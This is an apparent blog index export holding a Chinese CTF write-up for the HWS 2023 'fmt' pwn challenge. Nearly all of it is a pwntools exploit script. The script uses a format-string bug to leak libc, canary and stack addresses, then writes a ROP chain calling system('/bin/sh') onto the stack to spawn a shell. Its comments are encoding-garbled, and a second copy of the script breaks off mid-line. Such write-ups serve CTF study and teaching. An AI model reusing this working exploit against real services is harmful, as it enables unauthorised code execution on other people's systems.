[{"content":"","date":"July 18, 2023","permalink":"/","section":"","summary":"","title":""},{"content":"","date":"July 18, 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"July 18, 2023","permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"July 18, 2023","permalink":"/series/hws-2023/","section":"Series","summary":"","title":"HWS 2023"},{"content":"wpå¦‚ä¸‹:\n# encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 0 is_ret = 1 if is_debug: context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if is_remote == 1: taolve = remote(\u0026#34;60.204.140.184\u0026#34;, 30302) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd elif is_remote == 2: taolve = process([\u0026#34;/lib64/ld-linux-x86-64.so.2\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc.so.6\u0026#34;}) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd else: taolve = process(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) _binsh = 0x1d8698 def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elf = ELF(\u0026#39;./pwn\u0026#39;) \u0026#34;\u0026#34;\u0026#34; 1.æ³„éœ²å‡ºå¿…è¦çš„ä¿¡æ¯ (1)å…ˆæ³„éœ²_IO_2_1_stderrå‡½æ•°çš„çœŸå®åœ°å€ï¼Œç”¨æ¥è®¡ç®—libcçš„åç§»åœ°å€ (2)å†æ³„éœ²canaryï¼Œçœ‹çœ‹åé¢ä¼šä¸ä¼šç”¨åˆ° (3)æ¥ç€æ³„éœ²æ ˆä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œç”¨gdbè°ƒè¯•çœ‹å®ƒä¸æˆ‘ä»¬çš„retæŒ‡ä»¤åœ°å€ä¹‹é—´çš„è·ç¦»ï¼Œè®¡ç®—å¾—åˆ°retæŒ‡ä»¤çš„åœ°å€ (4)æœ€åæ³„éœ²æ ˆä¸Šmainå‡½æ•°ä¸€ä¸ªæŒ‡ä»¤çš„åœ°å€ï¼Œç”¨æ¥è®¡ç®—mainå‡½æ•°ä¸runå‡½æ•°çš„åç§» \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;-%10$p-%17$p-%14$p-%19$p-\u0026#34; taolve.recvuntil(b\u0026#34;I need a str: \u0026#34;) taolve.sendline(payload1) taolve.recvuntil(b\u0026#34;-0x\u0026#34;) _IO_2_1_stderr_ = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) canary = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) stack_1 = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) main1 = int(taolve.recvuntil(b\u0026#34;-\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) libc_base = _IO_2_1_stderr_ - libc.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] sys_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] run_base1 = main1 - elf.sym[\u0026#39;main\u0026#39;] - 28 log.success(\u0026#34;_IO_2_1_stderr_ = \u0026#34; + hex(_IO_2_1_stderr_)) log.success(\u0026#34;canary = \u0026#34; + hex(canary)) log.success(\u0026#34;stack_1 = \u0026#34; + hex(stack_1)) log.success(\u0026#34;libc_base = \u0026#34; + hex(libc_base)) log.success(\u0026#34;printf_got = \u0026#34; + hex(printf_got)) log.success(\u0026#34;system = \u0026#34; + hex(sys_addr)) log.success(\u0026#34;main1 = \u0026#34; + hex(main1)) log.success(\u0026#34;run_base1 = \u0026#34; + hex(run_base1)) \u0026#34;\u0026#34;\u0026#34; 2.è·³è½¬åˆ°mainå‡½æ•°çš„å¼€å¤´ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;ret_2_main!!!!!!!\u0026#34;) stack_2 = stack_1 - 0x20 + 0x28 log.success(\u0026#34;stack_2 = \u0026#34; + hex(stack_2)) c = 0xd8 payload11 = b\u0026#39;%\u0026#39; + str(c).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; payload11 += b\u0026#39;%11$hhn\u0026#39; n4 = len(payload11) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 payload11 += b\u0026#39;a\u0026#39; * n5 payload11 += p64(stack_2) log.success(\u0026#34;ret_2_main!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) \u0026#34;\u0026#34;\u0026#34; 3.åˆ©ç”¨å­—ç¬¦ä¸²æ¼æ´å‘æ ˆä¸Šå¡«å†™systemå‡½æ•°çš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;system_____å‰å››ä½_______!!!!!!!\u0026#34;) sys_addr_min = hex(sys_addr) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) if is_ret == 1: shift = 24 else: shift = 16 brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + shift brr[1] = 4 + shift brr[2] = 3 + shift brr[3] = 2 + shift brr[4] = 1 + shift brr[5] = 0 + shift log.success(\u0026#34;sys_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;sys_addr_min=\u0026#34; + str(sys_addr_min)) log.success(\u0026#34;bcdefg=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 # æ£€éªŒæ’åºåçš„ç»“æœ log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;system_____å®Œæˆå‰å››ä½_________!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; åœ¨æ ˆä¸Šå¡«å†™systemååŠéƒ¨åˆ†ï¼š \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;system_______å®Œæˆåå››ä½_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 3.å¡«å†™binshçš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;binsh_____å‰å››ä½_________!!!!!!!\u0026#34;) # binsh = _binsh + libc_base binsh = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() sys_addr_min = hex(binsh) pop_rdi_ret = 0x01453 payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 8 brr[1] = 4 + 8 brr[2] = 3 + 8 brr[3] = 2 + 8 brr[4] = 1 + 8 brr[5] = 0 + 8 log.success(\u0026#34;binsh_addr\u0026#34; + hex(binsh)) log.success(\u0026#34;binsh_addr_min=\u0026#34; + str(sys_addr_min)) text = 0 for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] text += 1 log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;binsh_____å®Œæˆå‰å››ä½_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; binshååŠéƒ¨åˆ†ï¼š \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;binsh_______å®Œæˆåå››ä½_______!!!!!!!\u0026#34;) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 4.å¡«å†™ret çš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ï¼ˆä¿è¯64ä½æ ˆå¹³è¡¡ï¼‰ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;ret_____å‰å››ä½_________addr!!!!!!!\u0026#34;) if is_remote == 1 or is_remote == 2: pop__ret = 0x22679 + libc_base else: pop__ret = 0x29cd6 + libc_base sys_addr_min = hex(pop__ret) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:4], 16) crr[1] = int(sys_addr_min[4:6], 16) crr[2] = int(sys_addr_min[6:8], 16) crr[3] = int(sys_addr_min[8:10], 16) crr[4] = int(sys_addr_min[10:12], 16) crr[5] = int(sys_addr_min[12:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 5 + 16 brr[1] = 4 + 16 brr[2] = 3 + 16 brr[3] = 2 + 16 brr[4] = 1 + 16 brr[5] = 0 + 16 log.success(\u0026#34;pop_ret_addr\u0026#34; + hex(pop__ret)) log.success(\u0026#34;pop_ret_addr_min=\u0026#34; + str(sys_addr_min)) for i in range(6): for j in range(0, 6 - i - 1): if crr[j] \u0026gt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2]) + hex(crr[3]) + hex(crr[4]) + hex(crr[5])) payload1 += b\u0026#39;%\u0026#39; + str(crr[0]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(1, 3): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(0, 3): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;ret_____å®Œæˆå‰å››ä½_________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•° \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; retååŠéƒ¨åˆ†ï¼š \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;\u0026#34; payload1 += b\u0026#39;%\u0026#39; + str(crr[3]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; for i in range(4, 6): payload1 += b\u0026#39;%\u0026#39; + str(crr[i] - crr[i - 1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; payload1 += str(11 - 3 + i).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hhn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 for i in range(3, 6): payload1 += p64(stack_2 + brr[i]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) if is_ret == 1: taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) log.success(\u0026#34;ret_______å®Œæˆåå››ä½_______addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; å†æ¥è·³è½¬ä¸€æ¬¡mainå‡½æ•°ï¼š \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload11) log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) \u0026#34;\u0026#34;\u0026#34; 5.å¡«å†™pop_rdi_ret çš„åœ°å€ çš„å‰å››ä½ï¼ï¼ï¼ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;pop_rdi_ret______________addr!!!!!!!\u0026#34;) ret_rdi = 0x01453 + run_base1 sys_addr_min = hex(ret_rdi) payload1 = b\u0026#34;\u0026#34; crr = [0, 1, 2, 3, 4, 5, 6, 7, 8] crr[0] = int(sys_addr_min[2:6], 16) crr[1] = int(sys_addr_min[6:10], 16) crr[2] = int(sys_addr_min[10:14], 16) brr = [0, 1, 2, 3, 4, 5, 6, 7, 8] brr[0] = 4 brr[1] = 2 brr[2] = 0 log.success(\u0026#34;pop_rdi_ret_addr\u0026#34; + hex(sys_addr)) log.success(\u0026#34;pop_rdi_ret_addr_min=\u0026#34; + str(sys_addr_min)) for i in range(3): for j in range(0, 3 - i - 1): if crr[j] \u0026lt; crr[j + 1]: crr[j], crr[j + 1] = crr[j + 1], crr[j] brr[j], brr[j + 1] = brr[j + 1], brr[j] log.success(\u0026#34;sort=\u0026#34; + hex(crr[0]) + hex(crr[1]) + hex(crr[2])) payload1 += b\u0026#39;%\u0026#39; + str(crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(11).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[1]-crr[2]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(12).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; payload1 += b\u0026#39;%\u0026#39; + str(crr[0]-crr[1]).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;c\u0026#39; + b\u0026#39;%\u0026#39; + str(13).encode(\u0026#39;utf-8\u0026#39;) + b\u0026#39;$hn\u0026#39; log.success(\u0026#34;len1 = \u0026#34; + str(len(payload1))) n4 = len(payload1) n5 = 0 if n4 \u0026lt; 40: n5 = 40 - n4 log.success(\u0026#34;len \u0026lt; 40\u0026#34;) payload1 += b\u0026#39;a\u0026#39; * n5 payload1 += p64(stack_2 + brr[2]) + p64(stack_2 + brr[1]) + p64(stack_2 + brr[0]) log.success(\u0026#34;len2 = \u0026#34; + str(len(payload1))) taolve.recvuntil(b\u0026#34;str: \u0026#34;) taolve.sendline(payload1) \u0026#34;\u0026#34;\u0026#34; å…¶å®è¿™é“é¢˜æœ¬åœ°å¾ˆæ—©å°±æ‰“é€šäº†ï¼Œä½†æ˜¯è¿œç¨‹ä¸€ç›´å‡ºé”™ï¼Œ æ‰€ä»¥æˆ‘åœ¨æ¯”èµ›æ—¶å°†4å­—èŠ‚è¦†æ•°æ®çš„æ–¹å¼æ”¹ä¸ºäº†2å­—èŠ‚åˆæ”¹ä¸ºäº†1å­—èŠ‚ï¼Œ ç»“æœè¿˜æ˜¯æ‰“ä¸é€šï¼Œ(æ‚² æœ€åæƒ³èµ·æ¥è¿˜å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ¥æ‰“å°æ ˆä¸Šçš„å€¼æ¥è¿œç¨‹è°ƒè¯• æ‰€ä»¥å°±æœ‰äº†æœ€åè¿™ä¸ªåƒæ‰“è¡¨ä¸€æ ·çš„è°ƒè¯•æ–¹æ³• å¯æƒœï¼Œæœ€ååšå®Œè¿™é“é¢˜å·²ç»æ²¡æœ‰æ—¶é—´åšåˆ«çš„é¢˜äº†(orz \u0026#34;\u0026#34;\u0026#34; taolve.recvuntil(b\u0026#34;str: \u0026#34;) pad = b\u0026#34;-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%24$p-\u0026#34; taolve.sendline(pad) taolve.interactive() ","date":"July 18, 2023","permalink":"/posts/wp/2023_07_hws/fmt/","section":"Posts","summary":"wpå¦‚ä¸‹: # encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 0 is_ret = 1 if is_debug: context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;)","title":"HWS 2023 fmt wp"},{"content":"æ¯”èµ›æ—¶çš„è„šæœ¬ï¼šï¼ˆæœ‰ç‚¹ä¹±ï¼‰\n# encoding: utf-8 from pwn import * from LibcSearcher import * is_debug = 1 is_remote = 1 is_gdb = 0 is_ret = 1 is_searcher = 0 is_sleep = 0 if is_sleep == 1: sleep(1) if is_debug: context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if is_remote == 1: taolve = remote(\u0026#34;60.204.140.184\u0026#34;, 30302) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd elif is_remote == 2: taolve = process([\u0026#34;/lib64/ld-linux-x86-64.so.2\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc.so.6\u0026#34;}) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) _binsh = 0x1b45bd else: taolve = process(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) _binsh = 0x1d8698 if is_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif is_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) pause() elif is_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elf = ELF(\u0026#39;./pwn\u0026#39;) \u0026#34;\u0026#34;\u0026#34; 1.æ³„éœ²å‡ºå¿…è¦çš„ä¿¡æ¯ \u0026#34;\u0026#34;\u0026#34; payload1 = b\u0026#34;-%10$p-%17$p-%14$p-%23$p-%19$p-\u0026#34; taolve.recvuntil(b\u0026#34;I need a str: \u0026#34;) taolve.sendline(payload1) taolve.recvuntil(b\u0026#34;-0x\u0026#34;) _IO_2_1_stderr_ = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) print(hex(_IO_2_1_stderr_)) can = taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;) canary = int(can, 16) print(\u0026#34;canary = \u0026#34; + hex(canary)) stack_1 = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) if is_searcher == 1: libc = LibcSearcher(\u0026#39;_IO_2_1_stderr_\u0026#39;, _IO_2_1_stderr_) libc_base = _IO_2_1_stderr_ - libc.dump(\u0026#39;_IO_2_1_stderr_\u0026#39;) log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) sys_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # + 0x40 # è¡¥ä¸Š0x40 else: log.success(\u0026#34;stack_1 = \u0026#34; + hex(stack_1)) libc_base = _IO_2_1_stderr_ - libc.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] log.success(\u0026#34;libc_base = \u0026#34; + hex(libc_base)) printf_got = elf.got[\u0026#39;printf\u0026#39;] log.success(\u0026#34;printf_got = \u0026#34; + hex(printf_got)) sys_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] log.success(\u0026#34;system = \u0026#34; + hex(sys_addr)) libc1 = ELF(\u0026#39;./libc.so.6\u0026#39;) libc_base123 = _IO_2_1_stderr_ - libc1.sym[\u0026#39;_IO_2_1_stderr_\u0026#39;] log.success(\u0026#34;libc_base123 = \u0026#34; + hex(libc_base123)) main = int(taolve.recvuntil(b\u0026#34;-0x\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) log.success(\u0026#34;main = \u0026#34; + hex(main)) run_base = main - 0x13c6 # ç¬¬ä¸€ä¸ªrun_baseé‡‡ç”¨çš„æ˜¯æ ˆä¸Šçš„æ•°æ®æ¥è®¡ç®—åç§»ï¼Œæ‰€ä»¥æ‰“é€šäº†æœ¬åœ°ä½†æ˜¯æ²¡æ‰“é€šè¿œç¨‹ main1 = int(taolve.recvuntil(b\u0026#34;-\u0026#34;, drop=\u0026#34;true\u0026#34;), 16) run_base1 = main1 - elf.sym[\u0026#39;main\u0026#39;] - 28 #åæ¥è¿œç¨‹ç”¨æ‰“è¡¨çš„æ–¹å¼è°ƒè¯•æ‰å‘ç°è‡ªå·±ç”¨æ ˆä¸Šçš„æ•°æ®è®¡ç®—åç§»æ˜¯ä¼šæ”¹å˜çš„ #æ‰€ä»¥run_base1åˆ©ç”¨rbpä¸‹é¢çš„æ•°æ®æ‰å¯ä»¥æ­£ç¡®åœ°è®¡ç®—åç§» log.success(\u0026#34;run_base = \u0026#34; + hex(run_base)) log.success(\u0026#34;run_base1 = \u0026#34; + hex(run_base1)) # pause() # taolve.interactive() \u0026#34;\u0026#34;\u0026#34; 2.è·³è½¬åˆ°mainå‡½æ•°çš„å¼€å¤´ \u0026#34;\u0026#34;\u0026#34; log.success(\u0026#34;main______________addr!!!!!!!\u0026#34;) stack_2 = stack_1 - 0x20 + 0x28 log.success(\u0026#34;stack_2 = \u0026#34; + hex(stack_2)) main_addr = run_base + 0x137c log.success(\u0026#34;main == \u0026#34; + hex(main_addr)) c = 0xd8 payload11 = 